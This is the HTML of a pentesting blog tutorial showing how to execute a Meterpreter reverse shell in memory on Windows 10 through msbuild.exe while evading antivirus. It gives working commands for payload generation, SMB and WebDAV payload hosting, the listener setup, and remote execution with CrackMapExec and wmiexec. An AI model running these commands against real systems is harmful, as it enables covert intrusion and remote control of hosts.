@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en-US"><![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en-US"><![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en-US"><![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en-US"><!--<![endif]-->
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><![endif]-->
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="pingback" href="" />
+<!--[if lt IE 9]>
+<script src="https://www.n00py.io/wp-content/themes/blackoot-lite/js/html5.js" type="text/javascript"></script>
+<![endif]-->
+<title>Executing Meterpreter in Memory on Windows 10 and Bypassing AntiVirus &#8211; n00py Blog</title>
+<link rel='dns-prefetch' href='//platform.twitter.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="n00py Blog &raquo; Feed" href="https://www.n00py.io/feed/" />
+<link rel="alternate" type="application/rss+xml" title="n00py Blog &raquo; Comments Feed" href="https://www.n00py.io/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="n00py Blog &raquo; Executing Meterpreter in Memory on Windows 10 and Bypassing AntiVirus Comments Feed" href="https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.n00py.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.6"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56692,8205,9792,65039],[55357,56692,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='mt-shcore-style-css'  href='https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/styles/shCore.css?ver=2.2.5' type='text/css' media='all' />
+<link rel='stylesheet' id='mt-theme-style-css'  href='https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/styles/shThemeRDark.css?ver=2.2.5' type='text/css' media='all' />
+<link rel='stylesheet' id='blackoot-css'  href='https://www.n00py.io/wp-content/themes/blackoot-lite/css/blackoot.min.css?ver=4.9.6' type='text/css' media='all' />
+<link rel='stylesheet' id='blackoot-style-css'  href='https://www.n00py.io/wp-content/themes/blackoot-lite/style.css?ver=4.9.6' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css'  href='https://www.n00py.io/wp-content/themes/blackoot-lite/css/font-awesome/css/font-awesome.min.css?ver=4.9.6' type='text/css' media='all' />
+<link rel='stylesheet' id='Open-sans-webfonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700&#038;subset=latin,latin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='Quicksand-webfonts-css'  href='//fonts.googleapis.com/css?family=Quicksand:400italic,700italic,400,700&#038;subset=latin,latin-ext' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/scripts/shCore.js?ver=2.2.5'></script>
+<script type='text/javascript' src='https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/scripts/shAutoloader.js?ver=2.2.5'></script>
+<script type='text/javascript' src='https://www.n00py.io/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='https://www.n00py.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='https://www.n00py.io/wp-includes/js/hoverIntent.min.js?ver=1.8.1'></script>
+<script type='text/javascript' src='https://www.n00py.io/wp-content/themes/blackoot-lite/js/blackoot.min.js?ver=4.9.6'></script>
+<link rel='https://api.w.org/' href='https://www.n00py.io/wp-json/' />
+<link rel='prev' title='Ducky-in-the-middle: Injecting keystrokes into plaintext protocols' href='https://www.n00py.io/2018/04/bsides-rochester-roc-presentation/' />
+<meta name="generator" content="WordPress 4.9.6" />
+<link rel="canonical" href="https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/" />
+<link rel='shortlink' href='https://www.n00py.io/?p=4846' />
+<link rel="alternate" type="application/json+oembed" href="https://www.n00py.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.n00py.io%2F2018%2F06%2Fexecuting-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.n00py.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.n00py.io%2F2018%2F06%2Fexecuting-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus%2F&#038;format=xml" />
+<style type="text/css" id="custom-background-css">
+body.custom-background { background-image: url("https://www.n00py.io/wp-content/themes/blackoot-lite/img/zwartevilt.png"); background-position: left top; background-size: auto; background-repeat: repeat; background-attachment: scroll; }
+</style>
+<meta name="twitter:widgets:theme" content="dark"><meta name="twitter:widgets:link-color" content="#000000"><meta name="twitter:widgets:border-color" content="#000000"><meta name="twitter:partner" content="tfwp"><link rel="icon" href="https://www.n00py.io/wp-content/uploads/2016/10/cropped-Snoopy-4-icon-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://www.n00py.io/wp-content/uploads/2016/10/cropped-Snoopy-4-icon-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="https://www.n00py.io/wp-content/uploads/2016/10/cropped-Snoopy-4-icon-180x180.png" />
+<meta name="msapplication-TileImage" content="https://www.n00py.io/wp-content/uploads/2016/10/cropped-Snoopy-4-icon-270x270.png" />
+
+<meta name="twitter:card" content="summary"><meta name="twitter:title" content="Executing Meterpreter in Memory on Windows 10 and Bypassing AntiVirus"><meta name="twitter:site" content="@n00py1"><meta name="twitter:description" content="Recently I read the article on the Coalfire Blog about executing an obfuscated PowerShell payload using Invoke-CradleCrafter.  This was very useful, as Windows Defender has upped its game lately and is now blocking Metasploit&#039;s Web Delivery module.  I wanted to demonstrate an alternate way to achieve the same goal, with the intention of not dropping&hellip;"><meta name="twitter:image" content="https://www.n00py.io/wp-content/uploads/2018/06/npspayload.png">
+</head><body class="post-template-default single single-post postid-4846 single-format-standard custom-background"><div id="main-wrap"><div id="header-wrap"><div id="tophead-wrap"><div class="container"><div class="tophead"><form role="search" method="get" class="search-form" action="https://www.n00py.io/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			</form></div></div></div><div id="header"><div class="container"><div id="logo"><a href="https://www.n00py.io" title='n00py Blog' rel='home'><h1 class="site-title">n00py Blog</h1></a></div><div id="tagline">/Users/n00py/</div></div></div><div id="nav-wrap"><div id="navbar" class="container"><div class="menu"><ul>
+<li ><a href="https://www.n00py.io/">Home</a></li><li class="page_item page-item-602"><a href="https://www.n00py.io/defense/">Defense</a></li>
+<li class="page_item page-item-16"><a href="https://www.n00py.io/github/">Github</a></li>
+<li class="page_item page-item-61"><a href="https://www.n00py.io/linkedin/">LinkedIn</a></li>
+<li class="page_item page-item-600"><a href="https://www.n00py.io/osx/">OSX</a></li>
+<li class="page_item page-item-531"><a href="https://www.n00py.io/pentesting/">Pentesting</a></li>
+<li class="page_item page-item-597"><a href="https://www.n00py.io/research/">Research</a></li>
+<li class="page_item page-item-2895"><a href="https://www.n00py.io/rss-feeds/">RSS Feed</a></li>
+<li class="page_item page-item-529"><a href="https://www.n00py.io/walkthroughs/">Walkthroughs</a></li>
+<li class="page_item page-item-2"><a href="https://www.n00py.io/whoami/">whoami</a></li>
+</ul></div>
+</div></div></div><div id="page-title"><div class="container"><div id="breadcrumbs"><a href="https://www.n00py.io">Home</a><span class="separator"> / </span><a href="https://www.n00py.io/category/pentesting/">Pentesting</a><span class="separator"> / </span>Executing Meterpreter in Memory on Windows 10 and Bypassing AntiVirus</div><h1>Executing Meterpreter in Memory on Windows 10 and Bypassing AntiVirus</h1></div></div><div class="container" id="main-content"><div id="page-container" class="with-sidebar"><div id="post-4846" class="single-post post-4846 post type-post status-publish format-standard hentry category-pentesting"><div class="postmetadata"><span class="entry-title hatom-feed-info">Executing Meterpreter in Memory on Windows 10 and Bypassing AntiVirus</span><span class="meta-date post-date updated"><i class="fa fa-calendar"></i><a href="https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/" title="Executing Meterpreter in Memory on Windows 10 and Bypassing AntiVirus" rel="bookmark">June 6, 2018			</a></span><span class="meta-author author vcard"><i class="fa fa-user"></i><a class="fn" href="https://www.n00py.io/author/n00py/" title="View all posts by n00py" rel="author">n00py</a></span><div class="meta-category"><span class="category-icon" title="Category"><i class="fa fa-tag"></i></span><a href="https://www.n00py.io/category/pentesting/">Pentesting</a></div><span class="meta-comments"><i class="fa fa-comment"></i><a href="https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/#respond">0 Comment</a></span></div><div class="post-contents entry-content"><p>Recently I read the article on the <a href="https://www.coalfire.com/Solutions/Coalfire-Labs/The-Coalfire-LABS-Blog/may-2018/powershell-in-memory-injection-using-certutil-exe">Coalfire Blog</a> about executing an obfuscated PowerShell payload using <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">Invoke-CradleCrafter</a>.  This was very useful, as Windows Defender has upped its game lately and is now blocking Metasploit&#8217;s Web Delivery module.  I wanted to demonstrate an alternate way to achieve the same goal, with the intention of not dropping any files on the host system and provide more options depending on what ports are allowed to egress the network.</p>
+<p>To generate the payload, I decided to go with <a href="https://github.com/trustedsec/nps_payload">nps_payload</a> created by <a href="https://twitter.com/Ben0xA">Ben Ten</a> and <a href="https://twitter.com/Spoonman1091">Spoonman1091</a>. It uses <a href="https://twitter.com/subTee">SubTee</a>&#8216;s method of using Msbuild.exe, which also bypasses many Application Whitelisting (AWL) configurations.</p>
+<p>To download nps_payload, perform the following steps:</p>
+<pre class="brush:plain">git clone https://github.com/trustedsec/nps_payload.git
+cd nps_payload/
+pip install -r requirements.txt
+python nps_payload.py</pre>
+<p>Type &#8220;<strong>1</strong>&#8221; to select <em>Generate msbuild/nps/msf payload</em></p>
+<p>Then type &#8220;<strong>3</strong>&#8221; to choose <em>windows/meterpreter/reverse_https</em></p>
+<p>This will output the file <strong>msbuild_nps.xml.</strong></p>
+<p><a href="https://www.n00py.io/wp-content/uploads/2018/06/npspayload.png"><img class="aligncenter size-full wp-image-4852" src="https://www.n00py.io/wp-content/uploads/2018/06/npspayload.png" alt="" width="559" height="620" srcset="https://www.n00py.io/wp-content/uploads/2018/06/npspayload.png 559w, https://www.n00py.io/wp-content/uploads/2018/06/npspayload-270x300.png 270w" sizes="(max-width: 559px) 100vw, 559px" /></a></p>
+<p>Rename it if you want.  To deliver it to the target, we will put it on an SMB share on our host.</p>
+<p>To stand up the SMB share, perform the following steps:</p>
+<pre class="brush:plain">apt-get install samba
+cd /etc/samba/
+vi smb.conf</pre>
+<p>Go ahead and add:</p>
+<pre class="brush:plain">[Guest]
+        comment = Guest
+        path = /tmp/share/
+        browseable = yes
+        read only = yes
+        guest ok = yes</pre>
+<p>to the bottom of smb.conf.  Copy your payload to the directory you specified for the path.</p>
+<pre class="brush:plain">mkdir /tmp/share
+cp ~/nps_payload/msbuild_nps.xml /tmp/share/</pre>
+<p>Now that the payload is on the SMB share, the next thing to do is stand up a Metasploit listener if you do not have one running yet.</p>
+<pre class="brush:plain">msfconsole
+msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https
+msf exploit(handler) &gt; set lhost 192.168.xxx.xxx
+msf exploit(handler) &gt; set lport 443
+msf exploit(handler) &gt; exploit -j</pre>
+<p>You can also use the <strong>msbuild_nps.rc</strong> file that is generated by nps_payload.  Make sure your <strong>LPORT</strong> and <strong>LHOST</strong> match what you provided to nps_payload.</p>
+<p>To execute the file on the remote host, you have multiple choices. If you have an RDP connection to the host, just paste in this command to the command prompt:</p>
+<pre class="brush:plain">%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest Share\msbuild_nps.xml</pre>
+<p><a href="https://www.n00py.io/wp-content/uploads/2018/06/msbuild-1.png"><img class="aligncenter wp-image-4853 size-full" src="https://www.n00py.io/wp-content/uploads/2018/06/msbuild-1.png" alt="" width="898" height="111" srcset="https://www.n00py.io/wp-content/uploads/2018/06/msbuild-1.png 898w, https://www.n00py.io/wp-content/uploads/2018/06/msbuild-1-300x37.png 300w, https://www.n00py.io/wp-content/uploads/2018/06/msbuild-1-768x95.png 768w" sizes="(max-width: 898px) 100vw, 898px" /></a>You should be able to execute this remotely over the network using common command exec tools.</p>
+<p>CrackMapExec:</p>
+<pre class="brush:plain">crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml'
+</pre>
+<p>Impacket&#8217;s wimiexec.py:</p>
+<pre class="brush:plain">python wmiexec.py Adminstrator:Password123@192.168.137.1 cme.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml</pre>
+<p>When testing this, I had a bit of trouble getting these to execute.  Because of this, I thought of a better way to deliver the payload instead of using SMB.  I decided to use <a href="https://en.wikipedia.org/wiki/WebDAV">WebDAV</a>.  Why WebDAV? Here&#8217;s the interesting thing about UNC paths. Windows will first try to reach the host over SMB on port 445.  If it cannot, it will try to use WebDAV on port 80.  This is useful for a few reasons:</p>
+<ol>
+<li>SMB is often blocked at the firewall.  If we want to pull the payload from a remote system, this may not work because port 445 is blocked.</li>
+<li>As of CrackMapExec version 4, it needs an SMB server running on port 445 to execute commands.  We cannot use our Samba share and CME on the same host at the same time.</li>
+<li>WebDAV can also go over HTTPS if network based detection is a concern.</li>
+</ol>
+<p>There are a bunch of ways to set up a WebDAV server.  While you can do it with Apache, I chose to use a python tool named <a href="https://wsgidav.readthedocs.io/en/latest/">WsgiDAV</a> to create one for me.</p>
+<p>You can install it with pip by simply typing:</p>
+<pre class="brush:plain"> pip install WsgiDAV</pre>
+<p>To use it, run the commands:</p>
+<pre class="brush:plain">pip install wsgidav cheroot
+wsgidav --host=0.0.0.0 --port=80 --root=/tmp</pre>
+<p>For this example, I put my payload in the<em> /tmp/</em> directory within a folder named &#8220;<em>test</em>&#8220;.</p>
+<p>To execute the payload remotely, we run a very similar command:</p>
+<p>CrackMapExec:</p>
+<pre class="brush:plain">crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml'</pre>
+<p><a href="https://www.n00py.io/wp-content/uploads/2018/06/cmedav-2.png"><img class="aligncenter wp-image-4881 size-full" src="https://www.n00py.io/wp-content/uploads/2018/06/cmedav-2.png" alt="" width="890" height="101" srcset="https://www.n00py.io/wp-content/uploads/2018/06/cmedav-2.png 890w, https://www.n00py.io/wp-content/uploads/2018/06/cmedav-2-300x34.png 300w, https://www.n00py.io/wp-content/uploads/2018/06/cmedav-2-768x87.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></a></p>
+<p>Impacket&#8217;s wimiexec.py:</p>
+<pre class="brush:plain">python wmiexec.py Administrator:Password123@192.168.137.1
+C:\&gt;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml</pre>
+<p><a href="https://www.n00py.io/wp-content/uploads/2018/06/wmiexec-webdav-1.png"><img class="aligncenter wp-image-4865 size-full" src="https://www.n00py.io/wp-content/uploads/2018/06/wmiexec-webdav-1.png" alt="" width="877" height="116" srcset="https://www.n00py.io/wp-content/uploads/2018/06/wmiexec-webdav-1.png 877w, https://www.n00py.io/wp-content/uploads/2018/06/wmiexec-webdav-1-300x40.png 300w, https://www.n00py.io/wp-content/uploads/2018/06/wmiexec-webdav-1-768x102.png 768w" sizes="(max-width: 877px) 100vw, 877px" /></a></p>
+<p>And with that, we now have file-less execution on our target without the use of SMB.  Nothing is written to disk, no SMB traffic outbound, and fully evades Anti-Virus software.</p>
+
+<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.n00py.io%2F2018%2F06%2Fexecuting-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus%2F&#038;via=n00py1" class="twitter-share-button">Tweet</a></div>
+<div class="clear"></div></div><br class="clear" /></div><div class="article_nav"><div class="previous navbutton"><a href="https://www.n00py.io/2018/04/bsides-rochester-roc-presentation/" rel="prev"><i class="fa fa-angle-double-left"></i>Previous Post</a></div><br class="clear" /></div><hr /><div class="comments">	<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/#respond" style="display:none;">Cancel reply</a></small></h3><p class="must-log-in">You must be <a href="https://www.n00py.io/wp-login.php?redirect_to=https%3A%2F%2Fwww.n00py.io%2F2018%2F06%2Fexecuting-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus%2F">logged in</a> to post a comment.</p>	</div><!-- #respond -->
+	</div><div class="article_nav"><div class="previous navbutton"><a href="https://www.n00py.io/2018/04/bsides-rochester-roc-presentation/" rel="prev"><i class="fa fa-angle-double-left"></i>Previous Post</a></div><br class="clear" /></div></div><div id="sidebar-container"><ul id="sidebar"><li id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://www.n00py.io/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			</form></li>
+<li id="categories-5" class="widget widget_categories"><h3 class="widget-title">Categories</h3><form action="https://www.n00py.io" method="get"><label class="screen-reader-text" for="cat">Categories</label><select  name='cat' id='cat' class='postform' >
+	<option value='-1'>Select Category</option>
+	<option class="level-0" value="15">Defense</option>
+	<option class="level-0" value="9">Exploit</option>
+	<option class="level-0" value="11">Incident Response</option>
+	<option class="level-0" value="3">OSX</option>
+	<option class="level-0" value="12">Pentesting</option>
+	<option class="level-0" value="8">persistence</option>
+	<option class="level-0" value="2">Post Exploitation</option>
+	<option class="level-0" value="14">Research</option>
+	<option class="level-0" value="10">Vulnerability</option>
+	<option class="level-0" value="13">Walkthrough</option>
+</select>
+</form>
+<script type='text/javascript'>
+/* <![CDATA[ */
+(function() {
+	var dropdown = document.getElementById( "cat" );
+	function onCatChange() {
+		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
+			dropdown.parentNode.submit();
+		}
+	}
+	dropdown.onchange = onCatChange;
+})();
+/* ]]> */
+</script>
+
+</li>
+<li id="rss-5" class="widget widget_rss"><h3 class="widget-title"><a class="rsswidget" href="https://www.n00py.io/feed/"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="https://www.n00py.io/wp-includes/images/rss.png" alt="RSS" /></a> <a class="rsswidget" href="https://www.n00py.io/">n00py Blog</a></h3><ul><li><a class='rsswidget' href='https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/'>Executing Meterpreter in Memory on Windows 10 and Bypassing AntiVirus</a></li><li><a class='rsswidget' href='https://www.n00py.io/2018/04/bsides-rochester-roc-presentation/'>Ducky-in-the-middle: Injecting keystrokes into plaintext protocols</a></li><li><a class='rsswidget' href='https://www.n00py.io/2018/03/microsoft-word-upload-to-stored-xss/'>Microsoft Word upload to Stored XSS</a></li><li><a class='rsswidget' href='https://www.n00py.io/2018/03/exploiting-complex-xss-payloads-in-a-constrained-parameter/'>Exploiting complex XSS payloads in a constrained parameter</a></li><li><a class='rsswidget' href='https://www.n00py.io/2018/01/bsides-puerto-rico-2017-2018-presentation/'>Bsides Puerto Rico 2017-2018 Presentation</a></li><li><a class='rsswidget' href='https://www.n00py.io/2017/12/raining-shells-on-linux-environments-with-hwacha/'>Raining shells on Linux environments with Hwacha</a></li><li><a class='rsswidget' href='https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/'>Exploiting blind Java deserialization with Burp and Ysoserial</a></li><li><a class='rsswidget' href='https://www.n00py.io/2017/10/detecting-crackmapexec-cme-with-bro-sysmon-and-powershell-logs/'>Detecting CrackMapExec (CME) with Bro, Sysmon, and Powershell logs</a></li><li><a class='rsswidget' href='https://www.n00py.io/2017/10/vulnhub-walkthrough-rickdiculouslyeasy-1/'>VulnHub Walkthrough: RickdiculouslyEasy 1</a></li><li><a class='rsswidget' href='https://www.n00py.io/2017/10/how-to-burp-good/'>How to Burp Good</a></li></ul></li>
+<li id="calendar-3" class="widget widget_calendar"><div id="calendar_wrap" class="calendar_wrap"><table id="wp-calendar">
+	<caption>June 2018</caption>
+	<thead>
+	<tr>
+		<th scope="col" title="Monday">M</th>
+		<th scope="col" title="Tuesday">T</th>
+		<th scope="col" title="Wednesday">W</th>
+		<th scope="col" title="Thursday">T</th>
+		<th scope="col" title="Friday">F</th>
+		<th scope="col" title="Saturday">S</th>
+		<th scope="col" title="Sunday">S</th>
+	</tr>
+	</thead>
+
+	<tfoot>
+	<tr>
+		<td colspan="3" id="prev"><a href="https://www.n00py.io/2018/04/">&laquo; Apr</a></td>
+		<td class="pad">&nbsp;</td>
+		<td colspan="3" id="next" class="pad">&nbsp;</td>
+	</tr>
+	</tfoot>
+
+	<tbody>
+	<tr>
+		<td colspan="4" class="pad">&nbsp;</td><td>1</td><td>2</td><td>3</td>
+	</tr>
+	<tr>
+		<td>4</td><td>5</td><td><a href="https://www.n00py.io/2018/06/06/" aria-label="Posts published on June 6, 2018">6</a></td><td>7</td><td>8</td><td>9</td><td id="today">10</td>
+	</tr>
+	<tr>
+		<td>11</td><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td><td>17</td>
+	</tr>
+	<tr>
+		<td>18</td><td>19</td><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td>
+	</tr>
+	<tr>
+		<td>25</td><td>26</td><td>27</td><td>28</td><td>29</td><td>30</td>
+		<td class="pad" colspan="1">&nbsp;</td>
+	</tr>
+	</tbody>
+	</table></div></li>
+<li id="archives-4" class="widget widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
+			<li><a href='https://www.n00py.io/2018/06/'>June 2018</a></li>
+	<li><a href='https://www.n00py.io/2018/04/'>April 2018</a></li>
+	<li><a href='https://www.n00py.io/2018/03/'>March 2018</a></li>
+	<li><a href='https://www.n00py.io/2018/01/'>January 2018</a></li>
+	<li><a href='https://www.n00py.io/2017/12/'>December 2017</a></li>
+	<li><a href='https://www.n00py.io/2017/11/'>November 2017</a></li>
+	<li><a href='https://www.n00py.io/2017/10/'>October 2017</a></li>
+	<li><a href='https://www.n00py.io/2017/09/'>September 2017</a></li>
+	<li><a href='https://www.n00py.io/2017/08/'>August 2017</a></li>
+	<li><a href='https://www.n00py.io/2017/06/'>June 2017</a></li>
+	<li><a href='https://www.n00py.io/2017/04/'>April 2017</a></li>
+	<li><a href='https://www.n00py.io/2017/03/'>March 2017</a></li>
+	<li><a href='https://www.n00py.io/2017/01/'>January 2017</a></li>
+	<li><a href='https://www.n00py.io/2016/10/'>October 2016</a></li>
+		</ul>
+		</li>
+<li id="twitter-follow-2" class="widget widget_twitter-follow"><div class="twitter-follow"><a href="https://twitter.com/intent/follow?screen_name=n00py1" class="twitter-follow-button">Follow @n00py1</a></div></li>
+<li id="twitter-timeline-profile-2" class="widget widget_twitter-timeline-profile"><div class="twitter-timeline-profile"><a class="twitter-timeline" data-lang="en" data-theme="dark" href="https://twitter.com/n00py1">Tweets by n00py1</a></div></li>
+</ul></div></div><div id="footer"><div class="container"><ul><li id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3><form action="https://www.n00py.io" method="get"><label class="screen-reader-text" for="categories-dropdown-4">Categories</label><select  name='cat' id='categories-dropdown-4' class='postform' >
+	<option value='-1'>Select Category</option>
+	<option class="level-0" value="15">Defense</option>
+	<option class="level-0" value="9">Exploit</option>
+	<option class="level-0" value="11">Incident Response</option>
+	<option class="level-0" value="3">OSX</option>
+	<option class="level-0" value="12">Pentesting</option>
+	<option class="level-0" value="8">persistence</option>
+	<option class="level-0" value="2">Post Exploitation</option>
+	<option class="level-0" value="14">Research</option>
+	<option class="level-0" value="10">Vulnerability</option>
+	<option class="level-0" value="13">Walkthrough</option>
+</select>
+</form>
+<script type='text/javascript'>
+/* <![CDATA[ */
+(function() {
+	var dropdown = document.getElementById( "categories-dropdown-4" );
+	function onCatChange() {
+		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
+			dropdown.parentNode.submit();
+		}
+	}
+	dropdown.onchange = onCatChange;
+})();
+/* ]]> */
+</script>
+
+</li>
+</ul></div></div><div id="sub-footer"><div class="container"><div class="sub-footer-left"><p>Copyright &copy; 2018 n00py Blog. Proudly powered by <a href="https://wordpress.org/" title="Semantic Personal Publishing Platform">WordPress</a>. Blackoot design by <a href="https://www.iceablethemes.com" title="Iceablethemes">Iceable Themes</a>.</p></div><div class="sub-footer-right"><div class="menu"><ul>
+<li ><a href="https://www.n00py.io/">Home</a></li><li class="page_item page-item-602"><a href="https://www.n00py.io/defense/">Defense</a></li>
+<li class="page_item page-item-16"><a href="https://www.n00py.io/github/">Github</a></li>
+<li class="page_item page-item-61"><a href="https://www.n00py.io/linkedin/">LinkedIn</a></li>
+<li class="page_item page-item-600"><a href="https://www.n00py.io/osx/">OSX</a></li>
+<li class="page_item page-item-531"><a href="https://www.n00py.io/pentesting/">Pentesting</a></li>
+<li class="page_item page-item-597"><a href="https://www.n00py.io/research/">Research</a></li>
+<li class="page_item page-item-2895"><a href="https://www.n00py.io/rss-feeds/">RSS Feed</a></li>
+<li class="page_item page-item-529"><a href="https://www.n00py.io/walkthroughs/">Walkthroughs</a></li>
+<li class="page_item page-item-2"><a href="https://www.n00py.io/whoami/">whoami</a></li>
+</ul></div>
+</div></div></div></div><script type='text/javascript'>
+/* <![CDATA[ */
+var MTBrushParams = {"baseUrl":"https:\/\/www.n00py.io\/wp-content\/plugins\/syntax-highlighter-mt"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/brushTypes.js?ver=2.2.5'></script>
+<script type='text/javascript' src='https://www.n00py.io/wp-includes/js/comment-reply.min.js?ver=4.9.6'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+window.twttr=(function(w){t=w.twttr||{};t._e=[];t.ready=function(f){t._e.push(f);};return t;}(window));
+/* ]]> */
+</script>
+<script type="text/javascript" id="twitter-wjs" async defer src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+<script type='text/javascript' src='https://www.n00py.io/wp-includes/js/wp-embed.min.js?ver=4.9.6'></script>
+    <script type="text/javascript">
+        jQuery(document).ready(function ($) {
+            //$( document ).ajaxStart(function() {
+            //});
+
+	        
+            for (var i = 0; i < document.forms.length; ++i) {
+                var form = document.forms[i];
+	            if ($(form).attr("method") != "get") { $(form).append('<input type="hidden" name="oxRncT" value="50vXF*" />'); }
+if ($(form).attr("method") != "get") { $(form).append('<input type="hidden" name="cdqOaSZsTxGhKoU" value="6TiS7H4uZQc@wWy" />'); }
